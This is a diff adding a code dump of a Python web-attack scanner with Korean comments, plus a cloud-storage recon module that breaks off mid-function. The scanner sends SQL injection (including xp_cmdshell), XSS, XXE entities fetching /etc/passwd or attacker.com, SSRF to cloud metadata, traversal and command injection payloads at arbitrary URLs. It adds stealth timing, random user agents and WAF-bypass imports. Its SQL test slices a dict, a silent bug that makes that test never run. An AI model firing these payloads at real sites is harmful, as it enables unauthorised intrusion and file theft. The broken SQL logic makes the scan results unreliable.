@@ -1,0 +1,1342 @@
+================================================================================
+프로젝트 코드 수집 - Part 28
+수집 시간: 2026-01-01 09:21:35
+파일 범위: 124 ~ 126
+================================================================================
+
+📁 이 파트에 포함된 파일:
+ 124. version_12.31.fin1\app\core\exploit\web_vulnerabilities.py (31,649 chars)
+ 125. version_12.31.fin1\app\core\exploit\__init__.py (587 chars)
+ 126. version_12.31.fin1\app\core\recon\cloud.py (14,184 chars)
+
+================================================================================
+
+
+================================================================================
+파일 경로: version_12.31.fin1\app\core\exploit\web_vulnerabilities.py
+파일 크기: 31,649 characters
+확장자: .py (python)
+================================================================================
+
+```python
+# app/core/exploit/web_vulnerabilities.py
+# 웹 취약점 실제 테스트 모듈
+
+import requests
+import time
+import re
+import random
+import logging
+from typing import Dict, Any, List, Optional
+from urllib.parse import urljoin, urlparse, quote
+
+from ..utils.encoding import PayloadEncoder, WAFBypass
+from ..utils.stealth import StealthMode, ConnectionPool, TimeoutManager
+from ..utils.rate_limit import RateLimitDetector
+from .advanced_verification import AdvancedVerification
+
+logger = logging.getLogger(__name__)
+
+
+class WebVulnerabilityScanner:
+    """
+    웹 애플리케이션 취약점 실제 테스트
+    """
+    
+    def __init__(self, timeout: int = 10, stealth_mode: bool = True, use_pool: bool = True):
+        self.timeout = timeout
+        self.stealth_mode = stealth_mode
+        self.use_pool = use_pool
+        
+        # User-Agent 설정 (스텔스 모드 여부와 관계없이)
+        self.user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+        
+        # 스텔스 모드 설정
+        if stealth_mode:
+            self.stealth = StealthMode(delay_min=0.5, delay_max=2.0)
+            self.user_agent = self.stealth.get_random_user_agent()
+        else:
+            self.stealth = None
+        
+        # 연결 풀 설정
+        if use_pool:
+            self.pool = ConnectionPool()
+            self.session = self.pool.get_session()
+        else:
+            self.pool = None
+            self.session = requests
+        
+        # 고급 검증
+        self.advanced_verification = AdvancedVerification(min_samples=3, confidence_threshold=0.8)
+        
+        # 타임아웃 관리
+        self.timeout_mgr = TimeoutManager(connect_timeout=5.0, read_timeout=10.0)
+        
+        # Rate Limiting 감지
+        self.rate_limit_detector = RateLimitDetector(max_requests_per_minute=60)
+    
+    def scan_all(self, url: str) -> Dict[str, Any]:
+        """
+        모든 웹 취약점 테스트
+        
+        Returns:
+            {
+                "sql_injection": {...},
+                "xss": {...},
+                "xxe": {...},
+                "ssrf": {...},
+                "lfi": {...},
+                "command_injection": {...}
+            }
+        """
+        from .latest_vectors import LatestAttackVectors
+        
+        latest_vectors = LatestAttackVectors(timeout=self.timeout)
+        
+        results = {
+            "sql_injection": self.test_sql_injection(url),
+            "xss": self.test_xss(url),
+            "xxe": self.test_xxe(url),
+            "ssrf": self.test_ssrf(url),
+            "lfi": self.test_lfi(url),
+            "command_injection": self.test_command_injection(url),
+            "path_traversal": self.test_path_traversal(url),
+            # 최신 공격 벡터
+            "ssti": latest_vectors.test_ssti(url),
+            "graphql": latest_vectors.test_graphql(url),
+            "jwt": latest_vectors.test_jwt(url),
+            "prototype_pollution": latest_vectors.test_prototype_pollution(url),
+            "http_request_smuggling": latest_vectors.test_http_request_smuggling(url),
+            # 인증 및 세션 관리
+            "broken_authentication": self._test_auth_session(url),
+            # 데이터베이스 공격 심화
+            "nosql_injection": self._test_nosql_injection(url),
+            "orm_injection": self._test_orm_injection(url)
+        }
+        
+        return results
+    
+    def test_sql_injection(self, url: str) -> Dict[str, Any]:
+        """
+        SQL Injection 테스트 (Error-based, Time-based, Boolean-based)
+        데이터베이스별 정교한 페이로드 사용
+        """
+        vulnerabilities = []
+        
+        # Error-based SQL Injection 페이로드 (데이터베이스별)
+        error_payloads = {
+            "mysql": [
+                "'",
+                "\"",
+                "' OR '1'='1",
+                "1' AND 1=1--",
+                "1' AND 1=2--",
+                "1' UNION SELECT NULL--",
+                "' OR 1=1--",
+                "admin'--",
+                "admin'/*",
+                "' OR 'x'='x",
+                "' OR 1=1#",
+                "') OR ('1'='1--",
+                "1' AND extractvalue(1,concat(0x7e,version()))--",
+                "1' AND updatexml(1,concat(0x7e,database()),1)--",
+                "1' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
+            ],
+            "postgresql": [
+                "'",
+                "1' AND 1=CAST(version() AS INT)--",
+                "1' AND 1=CAST(current_database() AS INT)--",
+                "1' AND 1=CAST((SELECT version()) AS INT)--",
+                "1' UNION SELECT NULL,NULL--",
+                "1' OR '1'='1'--"
+            ],
+            "mssql": [
+                "'",
+                "1' AND 1=CONVERT(INT,@@VERSION)--",
+                "1' AND 1=CONVERT(INT,DB_NAME())--",
+                "1'; EXEC xp_cmdshell('dir')--",
+                "1' UNION SELECT NULL,NULL--"
+            ],
+            "oracle": [
+                "'",
+                "1' AND 1=UTL_INADDR.get_host_name((SELECT banner FROM v$version WHERE rownum=1))--",
+                "1' UNION SELECT NULL FROM DUAL--",
+                "1' OR '1'='1'--"
+            ],
+            "generic": [
+                "'",
+                "\"",
+                "' OR '1'='1",
+                "1' AND 1=1--",
+                "1' AND 1=2--",
+                "1' UNION SELECT NULL--"
+            ]
+        }
+        
+        # Time-based SQL Injection 페이로드 (데이터베이스별)
+        time_payloads = {
+            "mysql": [
+                "1' AND SLEEP(5)--",
+                "1' AND BENCHMARK(5000000,MD5('A'))--",
+                "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
+                "1'; SELECT SLEEP(5)--"
+            ],
+            "postgresql": [
+                "1' AND pg_sleep(5)--",
+                "1'||(SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--",
+                "1'; SELECT pg_sleep(5)--"
+            ],
+            "mssql": [
+                "1'; WAITFOR DELAY '00:00:05'--",
+                "1'; IF (1=1) WAITFOR DELAY '00:00:05'--",
+                "1'; EXEC xp_cmdshell('ping 127.0.0.1')--"
+            ],
+            "oracle": [
+                "1' AND (SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5)--",
+                "1' AND DBMS_PIPE.RECEIVE_MESSAGE(CHR(65),5)--"
+            ],
+            "generic": [
+                "1' AND SLEEP(5)--",
+                "1'; WAITFOR DELAY '00:00:05'--",
+                "1' AND pg_sleep(5)--"
+            ]
+        }
+        
+        try:
+            parsed = urlparse(url)
+            base_url = f"{parsed.scheme}://{parsed.netloc}"
+            
+            # GET 파라미터 테스트
+            params = self._extract_params(url)
+            
+            for param_name in params[:5]:  # 최대 5개 파라미터만 테스트
+                # Error-based 테스트
+                for payload in error_payloads[:5]:
+                    try:
+                        test_url = f"{base_url}?{param_name}={quote(payload)}"
+                        response = requests.get(
+                            test_url,
+                            timeout=self.timeout,
+                            verify=False,
+                            headers={"User-Agent": self.user_agent}
+                        )
+                        
+                        # Rate Limiting 확인
+                        if self.rate_limit_detector.check_rate_limit(response):
+                            if self.rate_limit_detector.should_wait():
+                                wait_time = self.rate_limit_detector.get_wait_time()
+                                logger.warning(f"Rate limited. Waiting {wait_time:.1f}s...")
+                                time.sleep(wait_time)
+                            continue
+                        
+                        self.rate_limit_detector.record_request()
+                        
+                        # SQL 에러 패턴 확인 (데이터베이스별)
+                        error_patterns = {
+                            "mysql": [
+                                r"mysql.*error",
+                                r"warning.*mysql",
+                                r"you have an error in your sql syntax",
+                                r"mysql_fetch",
+                                r"mysql_num_rows",
+                                r"mysql_query"
+                            ],
+                            "postgresql": [
+                                r"postgresql.*error",
+                                r"pg_query\(\)",
+                                r"pg_exec\(\)",
+                                r"postgres.*syntax error"
+                            ],
+                            "mssql": [
+                                r"microsoft.*odbc",
+                                r"sql server.*error",
+                                r"odbc sql server driver",
+                                r"sqlserver jdbc"
+                            ],
+                            "oracle": [
+                                r"ora-\d+",
+                                r"oracle.*error",
+                                r"oracle.*exception",
+                                r"oracle jdbc"
+                            ],
+                            "generic": [
+                                r"sql.*syntax",
+                                r"sql.*error",
+                                r"unclosed quotation mark",
+                                r"driver.*sql",
+                                r"sql.*exception"
+                            ]
+                        }
+                        
+                        response_lower = response.text.lower()
+                        detected_db = None
+                        evidence = None
+                        
+                        for db_type, patterns in error_patterns.items():
+                            for pattern in patterns:
+                                match = re.search(pattern, response_lower, re.IGNORECASE)
+                                if match:
+                                    detected_db = db_type
+                                    evidence = match.group(0)
+                                    break
+                            if detected_db:
+                                break
+                        
+                        if detected_db:
+                            vulnerabilities.append({
+                                "type": f"Error-based SQL Injection ({detected_db})",
+                                "parameter": param_name,
+                                "payload": payload,
+                                "severity": "HIGH",
+                                "method": "GET",
+                                "detection_method": "error_based",
+                                "evidence": evidence,
+                                "confidence": 85 if detected_db != "generic" else 70
+                            })
+                            break
+                    except:
+                        continue
+                
+                # Time-based 테스트 (데이터베이스별)
+                for db_type, payloads in time_payloads.items():
+                    for payload in payloads[:3]:
+                        try:
+                            start = time.time()
+                            test_url = f"{base_url}?{param_name}={quote(payload)}"
+                            response = requests.get(
+                                test_url,
+                                timeout=10,
+                                verify=False,
+                                headers={"User-Agent": self.user_agent}
+                            )
+                            elapsed = time.time() - start
+                            
+                            # 정확한 시간 지연 확인 (5초 ± 0.5초)
+                            if elapsed >= 4.5:
+                                vulnerabilities.append({
+                                    "type": f"Time-based SQL Injection ({db_type})",
+                                    "parameter": param_name,
+                                    "payload": payload,
+                                    "measured_delay": elapsed,
+                                    "expected_delay": 5.0,
+                                    "severity": "HIGH",
+                                    "method": "GET",
+                                    "detection_method": "time_based",
+                                    "confidence": 90 if abs(elapsed - 5.0) < 0.5 else 75
+                                })
+                                break
+                        except:
+                            continue
+                
+                # Boolean-based Blind SQL Injection 테스트 - 다단계 검증
+                try:
+                    true_payload = f"1' AND '1'='1"
+                    false_payload = f"1' AND '1'='2"
+                    
+                    verification_result = self.advanced_verification.verify_boolean_based_sqli(
+                        base_url,
+                        f"{param_name}={quote(true_payload)}",
+                        f"{param_name}={quote(false_payload)}",
+                        samples=3
+                    )
+                    
+                    if verification_result.get("verified"):
+                        vulnerabilities.append({
+                            "type": "Boolean-based Blind SQL Injection",
+                            "parameter": param_name,
+                            "severity": "HIGH",
+                            "method": "GET",
+                            "detection_method": "boolean_based",
+                            "confidence": int(verification_result.get("confidence", 0.8) * 100),
+                            "verification": verification_result
+                        })
+                except Exception as e:
+                    logger.debug(f"Boolean-based SQLi 테스트 실패: {e}")
+                
+                if vulnerabilities:
+                    break
+            
+        except Exception as e:
+            logger.warning(f"SQL Injection 테스트 실패: {e}")
+        
+        # 신뢰도 스코어링 적용
+        try:
+            from ...core.utils.confidence import enhance_finding_with_confidence
+            
+            for i, vuln in enumerate(vulnerabilities):
+                vulnerabilities[i] = enhance_finding_with_confidence(vuln)
+        except ImportError:
+            # confidence 모듈이 없으면 기본 신뢰도만 추가
+            for vuln in vulnerabilities:
+                if "confidence" not in vuln:
+                    vuln["confidence"] = vuln.get("confidence", 70)
+        
+        return {
+            "vulnerable": len(vulnerabilities) > 0,
+            "vulnerabilities": vulnerabilities,
+            "tested": True
+        }
+    
+    def test_xss(self, url: str) -> Dict[str, Any]:
+        """
+        XSS (Cross-Site Scripting) 테스트
+        """
+        vulnerabilities = []
+        
+        # XSS 페이로드
+        xss_payloads = [
+            "<script>alert('XSS')</script>",
+            "<img src=x onerror=alert('XSS')>",
+            "<svg onload=alert('XSS')>",
+            "javascript:alert('XSS')",
+            "<body onload=alert('XSS')>",
+            "'\"><script>alert('XSS')</script>",
+            "<iframe src=javascript:alert('XSS')>",
+            "<input onfocus=alert('XSS') autofocus>"
+        ]
+        
+        try:
+            parsed = urlparse(url)
+            base_url = f"{parsed.scheme}://{parsed.netloc}"
+            
+            params = self._extract_params(url)
+            
+            for param_name in params[:5]:
+                for payload in xss_payloads[:5]:
+                    try:
+                        test_url = f"{base_url}?{param_name}={quote(payload)}"
+                        response = requests.get(
+                            test_url,
+                            timeout=self.timeout,
+                            verify=False,
+                            headers={"User-Agent": self.user_agent}
+                        )
+                        
+                        # 페이로드가 응답에 그대로 포함되어 있으면 취약
+                        if payload in response.text or payload.replace("'", "&#39;") in response.text:
+                            vulnerabilities.append({
+                                "type": "Reflected XSS",
+                                "parameter": param_name,
+                                "payload": payload,
+                                "severity": "MEDIUM",
+                                "method": "GET"
+                            })
+                            break
+                    except:
+                        continue
+                
+                if vulnerabilities:
+                    break
+            
+        except Exception as e:
+            logger.warning(f"XSS 테스트 실패: {e}")
+        
+        # 신뢰도 스코어링 적용
+        try:
+            from ...core.utils.confidence import enhance_finding_with_confidence
+            
+            for i, vuln in enumerate(vulnerabilities):
+                vulnerabilities[i] = enhance_finding_with_confidence(vuln)
+        except ImportError:
+            # confidence 모듈이 없으면 기본 신뢰도만 추가
+            for vuln in vulnerabilities:
+                if "confidence" not in vuln:
+                    vuln["confidence"] = vuln.get("confidence", 70)
+        
+        return {
+            "vulnerable": len(vulnerabilities) > 0,
+            "vulnerabilities": vulnerabilities,
+            "tested": True
+        }
+    
+    def test_xxe(self, url: str) -> Dict[str, Any]:
+        """
+        XXE (XML External Entity) 테스트
+        """
+        vulnerabilities = []
+        
+        # XXE 페이로드
+        xxe_payloads = [
+            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
+            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/xxe">]><foo>&xxe;</foo>',
+            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>'
+        ]
+        
+        try:
+            parsed = urlparse(url)
+            base_url = f"{parsed.scheme}://{parsed.netloc}"
+            
+            for payload in xxe_payloads[:2]:
+                try:
+                    headers = {
+                        "Content-Type": "application/xml",
+                        "User-Agent": self.user_agent
+                    }
+                    
+                    response = requests.post(
+                        base_url,
+                        data=payload,
+                        headers=headers,
+                        timeout=self.timeout,
+                        verify=False
+                    )
+                    
+                    # 파일 내용이나 외부 엔티티 참조가 응답에 포함되면 취약
+                    if "root:" in response.text or "attacker.com" in response.text or "[fonts]" in response.text:
+                        vulnerabilities.append({
+                            "type": "XXE",
+                            "payload": payload[:100],
+                            "severity": "HIGH",
+                            "method": "POST"
+                        })
+                        break
+                except:
+                    continue
+            
+        except Exception as e:
+            logger.warning(f"XXE 테스트 실패: {e}")
+        
+        # 신뢰도 스코어링 적용
+        try:
+            from ...core.utils.confidence import enhance_finding_with_confidence
+            
+            for i, vuln in enumerate(vulnerabilities):
+                vulnerabilities[i] = enhance_finding_with_confidence(vuln)
+        except ImportError:
+            # confidence 모듈이 없으면 기본 신뢰도만 추가
+            for vuln in vulnerabilities:
+                if "confidence" not in vuln:
+                    vuln["confidence"] = vuln.get("confidence", 70)
+        
+        return {
+            "vulnerable": len(vulnerabilities) > 0,
+            "vulnerabilities": vulnerabilities,
+            "tested": True
+        }
+    
+    def test_ssrf(self, url: str) -> Dict[str, Any]:
+        """
+        SSRF (Server-Side Request Forgery) 테스트
+        """
+        vulnerabilities = []
+        
+        # SSRF 테스트 URL (메타데이터 서비스 등)
+        ssrf_targets = [
+            "http://169.254.169.254/latest/meta-data/",
+            "http://127.0.0.1:22",
+            "http://localhost/admin",
+            "file:///etc/passwd"
+        ]
+        
+        try:
+            parsed = urlparse(url)
+            base_url = f"{parsed.scheme}://{parsed.netloc}"
+            
+            params = self._extract_params(url)
+            
+            for param_name in params[:3]:
+                for target in ssrf_targets[:2]:
+                    try:
+                        test_url = f"{base_url}?{param_name}={quote(target)}"
+                        response = requests.get(
+                            test_url,
+                            timeout=5,
+                            verify=False,
+                            headers={"User-Agent": self.user_agent},
+                            allow_redirects=False
+                        )
+                        
+                        # 메타데이터나 로컬 파일 내용이 응답에 포함되면 취약
+                        if "169.254.169.254" in target and ("instance-id" in response.text or "ami-id" in response.text):
+                            vulnerabilities.append({
+                                "type": "SSRF",
+                                "parameter": param_name,
+                                "target": target,
+                                "severity": "HIGH",
+                                "method": "GET"
+                            })
+                            break
+                    except:
+                        continue
+                
+                if vulnerabilities:
+                    break
+            
+        except Exception as e:
+            logger.warning(f"SSRF 테스트 실패: {e}")
+        
+        # 신뢰도 스코어링 적용
+        try:
+            from ...core.utils.confidence import enhance_finding_with_confidence
+            
+            for i, vuln in enumerate(vulnerabilities):
+                vulnerabilities[i] = enhance_finding_with_confidence(vuln)
+        except ImportError:
+            # confidence 모듈이 없으면 기본 신뢰도만 추가
+            for vuln in vulnerabilities:
+                if "confidence" not in vuln:
+                    vuln["confidence"] = vuln.get("confidence", 70)
+        
+        return {
+            "vulnerable": len(vulnerabilities) > 0,
+            "vulnerabilities": vulnerabilities,
+            "tested": True
+        }
+    
+    def test_lfi(self, url: str) -> Dict[str, Any]:
+        """
+        LFI (Local File Inclusion) 테스트
+        """
+        vulnerabilities = []
+        
+        # LFI 페이로드
+        lfi_payloads = [
+            "../../../etc/passwd",
+            "....//....//....//etc/passwd",
+            "..%2F..%2F..%2Fetc%2Fpasswd",
+            "..\\..\\..\\windows\\win.ini",
+            "/etc/passwd",
+            "C:\\windows\\win.ini"
+        ]
+        
+        try:
+            parsed = urlparse(url)
+            base_url = f"{parsed.scheme}://{parsed.netloc}"
+            
+            params = self._extract_params(url)
+            
+            for param_name in params[:3]:
+                for payload in lfi_payloads[:4]:
+                    try:
+                        test_url = f"{base_url}?{param_name}={quote(payload)}"
+                        response = requests.get(
+                            test_url,
+                            timeout=self.timeout,
+                            verify=False,
+                            headers={"User-Agent": self.user_agent}
+                        )
+                        
+                        # 파일 내용 패턴 확인
+                        if "root:" in response.text or "[fonts]" in response.text or "for 16-bit app support" in response.text:
+                            vulnerabilities.append({
+                                "type": "LFI",
+                                "parameter": param_name,
+                                "payload": payload,
+                                "severity": "HIGH",
+                                "method": "GET"
+                            })
+                            break
+                    except:
+                        continue
+                
+                if vulnerabilities:
+                    break
+            
+        except Exception as e:
+            logger.warning(f"LFI 테스트 실패: {e}")
+        
+        # 신뢰도 스코어링 적용
+        try:
+            from ...core.utils.confidence import enhance_finding_with_confidence
+            
+            for i, vuln in enumerate(vulnerabilities):
+                vulnerabilities[i] = enhance_finding_with_confidence(vuln)
+        except ImportError:
+            # confidence 모듈이 없으면 기본 신뢰도만 추가
+            for vuln in vulnerabilities:
+                if "confidence" not in vuln:
+                    vuln["confidence"] = vuln.get("confidence", 70)
+        
+        return {
+            "vulnerable": len(vulnerabilities) > 0,
+            "vulnerabilities": vulnerabilities,
+            "tested": True
+        }
+    
+    def test_command_injection(self, url: str) -> Dict[str, Any]:
+        """
+        Command Injection 테스트
+        """
+        vulnerabilities = []
+        
+        # Command Injection 페이로드
+        cmd_payloads = [
+            "; ls",
+            "| whoami",
+            "& dir",
+            "`id`",
+            "$(whoami)",
+            "; cat /etc/passwd",
+            "| type C:\\windows\\win.ini"
+        ]
+        
+        try:
+            parsed = urlparse(url)
+            base_url = f"{parsed.scheme}://{parsed.netloc}"
+            
+            params = self._extract_params(url)
+            
+            for param_name in params[:3]:
+                for payload in cmd_payloads[:4]:
+                    try:
+                        test_url = f"{base_url}?{param_name}={quote(payload)}"
+                        response = requests.get(
+                            test_url,
+                            timeout=self.timeout,
+                            verify=False,
+                            headers={"User-Agent": self.user_agent}
+                        )
+                        
+                        # 명령어 실행 결과 패턴 확인
+                        if "uid=" in response.text or "gid=" in response.text or "[fonts]" in response.text:
+                            vulnerabilities.append({
+                                "type": "Command Injection",
+                                "parameter": param_name,
+                                "payload": payload,
+                                "severity": "CRITICAL",
+                                "method": "GET"
+                            })
+                            break
+                    except:
+                        continue
+                
+                if vulnerabilities:
+                    break
+            
+        except Exception as e:
+            logger.warning(f"Command Injection 테스트 실패: {e}")
+        
+        # 신뢰도 스코어링 적용
+        try:
+            from ...core.utils.confidence import enhance_finding_with_confidence
+            
+            for i, vuln in enumerate(vulnerabilities):
+                vulnerabilities[i] = enhance_finding_with_confidence(vuln)
+        except ImportError:
+            # confidence 모듈이 없으면 기본 신뢰도만 추가
+            for vuln in vulnerabilities:
+                if "confidence" not in vuln:
+                    vuln["confidence"] = vuln.get("confidence", 70)
+        
+        return {
+            "vulnerable": len(vulnerabilities) > 0,
+            "vulnerabilities": vulnerabilities,
+            "tested": True
+        }
+    
+    def test_path_traversal(self, url: str) -> Dict[str, Any]:
+        """
+        Path Traversal 테스트
+        """
+        vulnerabilities = []
+        
+        # Path Traversal 페이로드
+        traversal_payloads = [
+            "../../../etc/passwd",
+            "..\\..\\..\\windows\\win.ini",
+            "....//....//etc/passwd",
+            "/etc/passwd%00",
+            "..%2F..%2F..%2Fetc%2Fpasswd"
+        ]
+        
+        try:
+            parsed = urlparse(url)
+            base_url = f"{parsed.scheme}://{parsed.netloc}"
+            
+            # URL 경로에 직접 삽입
+            for payload in traversal_payloads[:3]:
+                try:
+                    test_url = urljoin(base_url, payload)
+                    response = requests.get(
+                        test_url,
+                        timeout=self.timeout,
+                        verify=False,
+                        headers={"User-Agent": self.user_agent}
+                    )
+                    
+                    if "root:" in response.text or "[fonts]" in response.text:
+                        vulnerabilities.append({
+                            "type": "Path Traversal",
+                            "payload": payload,
+                            "severity": "HIGH",
+                            "method": "GET"
+                        })
+                        break
+                except:
+                    continue
+            
+        except Exception as e:
+            logger.warning(f"Path Traversal 테스트 실패: {e}")
+        
+        # 신뢰도 스코어링 적용
+        try:
+            from ...core.utils.confidence import enhance_finding_with_confidence
+            
+            for i, vuln in enumerate(vulnerabilities):
+                vulnerabilities[i] = enhance_finding_with_confidence(vuln)
+        except ImportError:
+            # confidence 모듈이 없으면 기본 신뢰도만 추가
+            for vuln in vulnerabilities:
+                if "confidence" not in vuln:
+                    vuln["confidence"] = vuln.get("confidence", 70)
+        
+        return {
+            "vulnerable": len(vulnerabilities) > 0,
+            "vulnerabilities": vulnerabilities,
+            "tested": True
+        }
+    
+    def _test_auth_session(self, url: str) -> Dict[str, Any]:
+        """인증 및 세션 관리 테스트"""
+        try:
+            from .auth_session import AuthSessionTester
+            tester = AuthSessionTester(timeout=self.timeout)
+            return {
+                "broken_authentication": tester.test_broken_authentication(url),
+                "oauth_oidc": tester.test_oauth_oidc(url),
+                "api_keys": tester.test_api_keys(url)
+            }
+        except Exception as e:
+            logger.warning(f"인증/세션 테스트 실패: {e}")
+            return {"tested": False, "error": str(e)}
+    
+    def _test_nosql_injection(self, url: str) -> Dict[str, Any]:
+        """NoSQL Injection 테스트"""
+        try:
+            from .db_advanced import AdvancedDatabaseAttacks
+            tester = AdvancedDatabaseAttacks(timeout=self.timeout)
+            return tester.test_nosql_injection(url)
+        except Exception as e:
+            logger.warning(f"NoSQL Injection 테스트 실패: {e}")
+            return {"tested": False, "error": str(e)}
+    
+    def _test_orm_injection(self, url: str) -> Dict[str, Any]:
+        """ORM Injection 테스트"""
+        try:
+            from .db_advanced import AdvancedDatabaseAttacks
+            tester = AdvancedDatabaseAttacks(timeout=self.timeout)
+            return tester.test_orm_injection(url)
+        except Exception as e:
+            logger.warning(f"ORM Injection 테스트 실패: {e}")
+            return {"tested": False, "error": str(e)}
+    
+    def _extract_params(self, url: str) -> List[str]:
+        """
+        URL에서 파라미터 이름 추출
+        """
+        try:
+            parsed = urlparse(url)
+            params = []
+            
+            # 쿼리 스트링에서 파라미터 추출
+            if parsed.query:
+                for param in parsed.query.split("&"):
+                    if "=" in param:
+                        params.append(param.split("=")[0])
+            
+            # 파라미터가 없으면 기본값 사용
+            if not params:
+                params = ["id", "page", "file", "path", "name", "search", "q", "query"]
+            
+            return params
+        except:
+            return ["id", "page", "file"]
+```
+
+--------------------------------------------------------------------------------
+
+
+================================================================================
+파일 경로: version_12.31.fin1\app\core\exploit\__init__.py
+파일 크기: 587 characters
+확장자: .py (python)
+================================================================================
+
+```python
+# app/core/exploit/__init__.py
+
+from .verifier import ExploitVerifier
+from .web_vulnerabilities import WebVulnerabilityScanner
+from .attack_chain import AttackChainBuilder, Vulnerability, AttackStep, AttackPath
+from .latest_vectors import LatestAttackVectors
+from .auth_session import AuthSessionTester
+from .db_advanced import AdvancedDatabaseAttacks
+
+__all__ = [
+    'ExploitVerifier',
+    'WebVulnerabilityScanner',
+    'AttackChainBuilder',
+    'Vulnerability',
+    'AttackStep',
+    'AttackPath',
+    'LatestAttackVectors',
+    'AuthSessionTester',
+    'AdvancedDatabaseAttacks'
+]
+```
+
+--------------------------------------------------------------------------------
+
+
+================================================================================
+파일 경로: version_12.31.fin1\app\core\recon\cloud.py
+파일 크기: 14,184 characters
+확장자: .py (python)
+================================================================================
+
+```python
+# app/core/recon/cloud.py
+# 클라우드 인프라 정보 수집 모듈
+
+import requests
+import re
+import json
+import logging
+from typing import Dict, Any, List, Optional
+from urllib.parse import urlparse
+
+logger = logging.getLogger(__name__)
+
+
+def check_s3_bucket(bucket_name: str) -> Dict[str, Any]:
+    """
+    S3 버킷 접근 가능 여부 확인
+    
+    Returns:
+        {
+            "exists": True,
+            "public": True,
+            "region": "us-east-1"
+        }
+    """
+    s3_info = {
+        "exists": False,
+        "public": False,
+        "region": None
+    }
+    
+    # S3 버킷 URL 패턴
+    s3_urls = [
+        f"https://{bucket_name}.s3.amazonaws.com",
+        f"https://s3.amazonaws.com/{bucket_name}",
+    ]
+    
+    for url in s3_urls:
+        try:
+            response = requests.get(url, timeout=5, allow_redirects=False)
+            if response.status_code in [200, 403]:
+                s3_info["exists"] = True
+                s3_info["public"] = (response.status_code == 200)
+                break
+        except:
+            continue
+    
+    return s3_info
+
+
+def analyze_s3_bucket_policy(bucket_name: str) -> Dict[str, Any]:
+    """
+    S3 버킷 정책 및 ACL 분석
+    
+    Returns:
+        {
+            "bucket_policy": {...},
+            "acl": {...},
+            "public_access_block": {...},
+            "security_issues": [...]
+        }
+    """
+    policy_info = {
+        "bucket_policy": None,
+        "acl": None,
+        "public_access_block": None,
+        "security_issues": []
+    }
+    
+    # boto3를 사용한 상세 분석 (자격 증명이 있는 경우)
+    try:
+        import boto3
+        from botocore.exceptions import ClientError, NoCredentialsError
+        
+        try:
+            s3_client = boto3.client('s3')
+            
+            # 버킷 정책 확인
+            try:
+                policy = s3_client.get_bucket_policy(Bucket=bucket_name)
+                policy_info["bucket_policy"] = policy.get("Policy")
+                
+                # 정책에서 공개 접근 허용 여부 확인
+                if policy_info["bucket_policy"]:
+                    policy_json = json.loads(policy_info["bucket_policy"])
+                    statements = policy_json.get("Statement", [])
+                    for stmt in statements:
+                        if stmt.get("Effect") == "Allow" and stmt.get("Principal") == "*":
+                            policy_info["security_issues"].append({
+                                "type": "public_policy",
+                                "severity": "HIGH",
+                                "description": "버킷 정책에서 모든 사용자에게 접근 허용"
+                            })
+            except ClientError as e:
+                if e.response['Error']['Code'] != 'NoSuchBucketPolicy':
+                    policy_info["security_issues"].append({
+                        "type": "policy_error",
+                        "severity": "INFO",
+                        "description": f"정책 조회 실패: {e}"
+                    })
+            
+            # ACL 확인
+            try:
+                acl = s3_client.get_bucket_acl(Bucket=bucket_name)
+                grants = acl.get("Grants", [])
+                
+                policy_info["acl"] = {
+                    "grants": grants,
+                    "public_read": False,
+                    "public_write": False
+                }
+                
+                for grant in grants:
+                    grantee = grant.get("Grantee", {})
+                    if grantee.get("Type") == "Group" and "AllUsers" in grantee.get("URI", ""):
+                        permission = grant.get("Permission")
+                        if permission in ["READ", "READ_ACP"]:
+                            policy_info["acl"]["public_read"] = True
+                            policy_info["security_issues"].append({
+                                "type": "public_acl_read",
+                                "severity": "HIGH",
+                                "description": "ACL에서 모든 사용자에게 읽기 권한 부여"
+                            })
+                        if permission in ["WRITE", "WRITE_ACP", "FULL_CONTROL"]:
+                            policy_info["acl"]["public_write"] = True
+                            policy_info["security_issues"].append({
+                                "type": "public_acl_write",
+                                "severity": "CRITICAL",
+                                "description": "ACL에서 모든 사용자에게 쓰기 권한 부여"
+                            })
+            except ClientError as e:
+                policy_info["security_issues"].append({
+                    "type": "acl_error",
+                    "severity": "INFO",
+                    "description": f"ACL 조회 실패: {e}"
+                })
+            
+            # 퍼블릭 접근 차단 설정 확인
+            try:
+                public_access = s3_client.get_public_access_block(Bucket=bucket_name)
+                policy_info["public_access_block"] = public_access.get("PublicAccessBlockConfiguration", {})
+            except ClientError as e:
+                if e.response['Error']['Code'] != 'NoSuchPublicAccessBlockConfiguration':
+                    policy_info["security_issues"].append({
+                        "type": "public_access_block_error",
+                        "severity": "INFO",
+                        "description": f"퍼블릭 접근 차단 설정 조회 실패: {e}"
+                    })
+            
+        except NoCredentialsError:
+            policy_info["security_issues"].append({
+                "type": "no_credentials",
+                "severity": "INFO",
+                "description": "AWS 자격 증명이 없어 상세 분석 불가 (HTTP 요청으로만 확인)"
+            })
+            
+    except ImportError:
+        # boto3가 없으면 HTTP 요청으로만 확인
+        policy_info["security_issues"].append({
+            "type": "boto3_missing",
+            "severity": "INFO",
+            "description": "boto3가 설치되지 않아 상세 분석 불가 (HTTP 요청으로만 확인)"
+        })
+        
+        # HTTP 요청으로 버킷 접근 가능 여부만 확인
+        s3_info = check_s3_bucket(bucket_name)
+        if s3_info["public"]:
+            policy_info["security_issues"].append({
+                "type": "public_access",
+                "severity": "HIGH",
+                "description": "HTTP 요청으로 버킷에 공개 접근 가능"
+            })
+    
+    return policy_info
+
+
+def check_azure_blob(account_name: str, container_name: str = None) -> Dict[str, Any]:
+    """
+    Azure Blob Storage 접근 가능 여부 확인
+    
+    Returns:
+        {
+            "exists": True,
+            "public": True
+        }
+    """
+    azure_info = {
+        "exists": False,
+        "public": False
+    }
+    
+    if container_name:
+        url = f"https://{account_name}.blob.core.windows.net/{container_name}"
+    else:
+        url = f"https://{account_name}.blob.core.windows.net"
+    
+    try:
